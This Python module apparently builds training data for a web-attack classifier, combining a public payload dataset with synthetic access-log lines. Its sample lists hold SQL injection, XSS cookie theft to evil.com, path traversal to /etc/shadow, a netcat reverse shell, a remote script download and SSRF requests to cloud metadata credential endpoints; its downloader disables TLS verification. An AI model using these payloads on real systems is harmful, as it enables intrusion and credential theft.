"""
dataset.py — Loads and prepares training data from the HttpParamsDataset
(https://github.com/Morzeux/HttpParamsDataset, MIT licence) plus synthetic
SSRF examples (no public dataset covers SSRF payloads).

The CSV is downloaded once to data/payload_full.csv on first run.
"""

import csv
import os
import random
import ssl
import urllib.request

_DIR      = os.path.dirname(__file__)
_DATA_DIR = os.path.join(_DIR, "data")
_CSV_PATH = os.path.join(_DATA_DIR, "payload_full.csv")
_CSV_URL  = (
    "https://raw.githubusercontent.com/Morzeux/HttpParamsDataset"
    "/master/payload_full.csv"
)

# No effective cap — use all available examples per class.
# cmdi only has 89 rows in the dataset so it will naturally be smaller;
# class_weight='balanced' corrects for it.
_CAP  = 999_999
_SEED = 42

# Map dataset labels → our internal label constants
_LABEL_MAP = {
    "norm":           "safe",
    "sqli":           "sqli",
    "xss":            "xss",
    "path-traversal": "path_traversal",
    "cmdi":           "cmd_injection",
}

# Textbook / tutorial attack patterns not covered by the automated SQLMap-style
# payloads in HttpParamsDataset — added as a synthetic supplement so the model
# handles both real-world scanner output AND manually crafted attacks.
# Pre-formed safe log lines (static files / no-param requests) added directly —
# these don't use the payload-wrapping template because they have no parameter.
_SAFE_LOGS = [
    "GET /index.html HTTP/1.1",
    "GET /about.html HTTP/1.1",
    "GET /favicon.ico HTTP/1.1",
    "GET /robots.txt HTTP/1.1",
    "GET /sitemap.xml HTTP/1.1",
    "GET /static/css/main.css HTTP/1.1",
    "GET /static/js/app.js HTTP/1.1",
    "GET /images/logo.png HTTP/1.1",
    "GET /fonts/roboto.woff2 HTTP/1.1",
    "GET /dashboard HTTP/1.1",
    "GET /api/health HTTP/1.1",
    "GET /api/v1/users HTTP/1.1",
    "POST /api/checkout HTTP/1.1",
    "GET /news/latest HTTP/1.1",
    "GET /help/faq HTTP/1.1",
]

# Raw payloads (not full log lines) to be wrapped in the shared templates
_SUPPLEMENT: dict[str, list[str]] = {
    "sqli": [
        "' OR 1=1--",
        "' OR '1'='1",
        "1 OR 1=1",
        "admin'--",
        "' OR 1=1-- -",
        "1 UNION SELECT null, username, password FROM users--",
        "1; DROP TABLE users--",
        "1' AND SLEEP(5)--",
        "' OR 'x'='x",
        "1 AND 1=1",
        "1' ORDER BY 3--",
        "' UNION SELECT table_name FROM information_schema.tables--",
    ],
    "xss": [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
        "javascript:alert(document.cookie)",
        "<body onload=alert('xss')>",
        "<iframe src=javascript:alert('xss')>",
        "';alert(1)//",
        "<script>document.location='http://evil.com?c='+document.cookie</script>",
    ],
    "path_traversal": [
        "../../../etc/passwd",
        "../../../../etc/shadow",
        "../../windows/system32/drivers/etc/hosts",
        "..%2F..%2Fetc%2Fpasswd",
        "....//....//etc/passwd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    ],
    "cmd_injection": [
        "; cat /etc/passwd",
        "| id",
        "&& whoami",
        "`id`",
        "$(id)",
        "; ls -la",
        "| nc attacker.com 4444 -e /bin/sh",
        "&& wget http://evil.com/shell.sh",
    ],
}

# HTTP log-line templates: the payload is embedded at {} to produce a
# realistic access-log entry for each attack class.
_TEMPLATES: dict[str, list[str]] = {
    # Identical templates for every class — the model must learn from
    # payload content, not URL structure (same as a real WAF).
    cls: [
        "GET /search.php?q={} HTTP/1.1",
        "GET /view.php?id={} HTTP/1.1",
        "GET /profile.php?user={} HTTP/1.1",
        "POST /login.php HTTP/1.1 username={}",
        "GET /download.php?file={} HTTP/1.1",
        "GET /ping.php?host={} HTTP/1.1",
        "GET /fetch.php?url={} HTTP/1.1",
        "POST /comment.php HTTP/1.1 text={}",
        "GET /page.php?input={} HTTP/1.1",
        "POST /submit.php HTTP/1.1 data={}",
    ]
    for cls in ["safe", "sqli", "xss", "path_traversal", "cmd_injection"]
}

_SSRF_LOGS = [
    "GET /fetch.php?url=http://169.254.169.254/latest/meta-data/ HTTP/1.1",
    "GET /proxy.php?src=http://169.254.169.254/latest/meta-data/iam/security-credentials/ HTTP/1.1",
    "GET /load.php?href=http://169.254.169.254/latest/user-data HTTP/1.1",
    "GET /fetch.php?resource=http://metadata.google.internal/computeMetadata/v1/ HTTP/1.1",
    "GET /proxy.php?target=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token HTTP/1.1",
    "GET /load.php?url=http://metadata.google.internal/computeMetadata/v1/project/project-id HTTP/1.1",
    "GET /fetch.php?url=http://169.254.169.254/metadata/instance?api-version=2021-02-01 HTTP/1.1",
    "GET /proxy.php?target=http://localhost:6379/ HTTP/1.1",
    "GET /load.php?src=http://localhost:8080/admin HTTP/1.1",
    "GET /fetch.php?url=http://127.0.0.1:9200/_cat/indices HTTP/1.1",
    "GET /proxy.php?to=http://0.0.0.0:22 HTTP/1.1",
    "GET /load.php?src=http://internal-service:8080/admin HTTP/1.1",
    "GET /webhook.php?endpoint=http://192.168.1.1/router-admin HTTP/1.1",
    "GET /import.php?feed=http://127.0.0.1:9200/_cat/indices HTTP/1.1",
    "GET /fetch.php?url=http://10.0.0.1:8080/actuator/env HTTP/1.1",
    "GET /proxy.php?src=http://172.16.0.1/admin HTTP/1.1",
    "GET /fetch.php?url=http://10.0.0.254/api/internal HTTP/1.1",
    "GET /load.php?src=http://192.168.0.1/config.json HTTP/1.1",
    "GET /proxy.php?target=http://172.31.0.1/metadata HTTP/1.1",
    "GET /fetch.php?url=file:///etc/passwd HTTP/1.1",
    "GET /load.php?src=dict://127.0.0.1:6379/info HTTP/1.1",
    "GET /proxy.php?url=gopher://localhost:25/HELO HTTP/1.1",
    "GET /fetch.php?url=http://consul.service.internal:8500/v1/catalog/services HTTP/1.1",
    "GET /load.php?src=http://etcd.internal:2379/v2/keys HTTP/1.1",
    "GET /preview.php?url=http://jenkins.internal:8080/script HTTP/1.1",
    "GET /fetch.php?url=http://grafana.internal:3000/api/datasources HTTP/1.1",
    "GET /redirect.php?to=http://169.254.169.254/latest/user-data HTTP/1.1",
    "GET /get.php?url=http://[::1]:80/ HTTP/1.1",
    "GET /load.php?src=http://localhost/server-status HTTP/1.1",
    "GET /fetch.php?url=http://169.254.169.254/opc/v1/instance/ HTTP/1.1",
    "GET /proxy.php?target=http://100.100.100.200/latest/meta-data/ HTTP/1.1",
    "GET /load.php?src=http://kubernetes.default.svc/api/v1/secrets HTTP/1.1",
    "GET /webhook.php?url=http://127.1/admin HTTP/1.1",
    "GET /proxy.php?src=http://0177.0.0.1/ HTTP/1.1",
    "GET /fetch.php?url=http://2130706433/ HTTP/1.1",
    "GET /load.php?href=http://169.254.169.254/1.0/meta-data/ HTTP/1.1",
    "GET /import.php?feed=http://localtest.me/ HTTP/1.1",
    "GET /fetch.php?url=http://169.254.169.254/computeMetadata/v1/instance/id HTTP/1.1",
    "GET /proxy.php?target=http://169.254.169.254/latest/meta-data/public-keys/ HTTP/1.1",
    "GET /load.php?src=http://169.254.169.254/latest/meta-data/network/interfaces/ HTTP/1.1",
]


def _download() -> None:
    os.makedirs(_DATA_DIR, exist_ok=True)
    print("Downloading HttpParamsDataset (~2 MB) …", flush=True)
    # unverified context works on macOS where Python certs aren't installed;
    # on Linux (Render) the system CA bundle is always present.
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    opener = urllib.request.build_opener(urllib.request.HTTPSHandler(context=ctx))
    with opener.open(_CSV_URL) as resp, open(_CSV_PATH, "wb") as f:
        f.write(resp.read())
    print(f"Saved → {_CSV_PATH}", flush=True)


def _wrap(payload: str, label: str) -> str:
    rng = random.Random(hash(payload))
    return rng.choice(_TEMPLATES[label]).format(payload)


def load() -> tuple[list[str], list[str]]:
    """Return (log_lines, labels) ready for sklearn."""
    if not os.path.exists(_CSV_PATH):
        _download()

    rng = random.Random(_SEED)
    groups: dict[str, list[str]] = {k: [] for k in _LABEL_MAP}

    with open(_CSV_PATH, newline="", encoding="utf-8", errors="replace") as f:
        for row in csv.DictReader(f):
            at = row["attack_type"]
            if at in groups:
                groups[at].append(row["payload"])

    log_lines: list[str] = []
    labels:    list[str] = []

    for csv_label, our_label in _LABEL_MAP.items():
        pool    = groups[csv_label]
        sample  = rng.sample(pool, min(_CAP, len(pool)))
        for payload in sample:
            log_lines.append(_wrap(payload, our_label))
            labels.append(our_label)

    # Synthetic supplement: textbook attack payloads not in HttpParamsDataset
    for our_label, payloads in _SUPPLEMENT.items():
        for payload in payloads:
            log_lines.append(_wrap(payload, our_label))
            labels.append(our_label)

    # Static-file safe requests (no query parameters — added as full log lines)
    log_lines.extend(_SAFE_LOGS)
    labels.extend(["safe"] * len(_SAFE_LOGS))

    # SSRF: no public dataset available — use curated synthetic examples
    log_lines.extend(_SSRF_LOGS)
    labels.extend(["ssrf"] * len(_SSRF_LOGS))

    return log_lines, labels


def summary() -> None:
    import collections
    logs, lbls = load()
    counts = collections.Counter(lbls)
    print(f"Total examples: {len(logs)}")
    for lbl, n in sorted(counts.items()):
        print(f"  {lbl:20s}: {n}")


if __name__ == "__main__":
    summary()
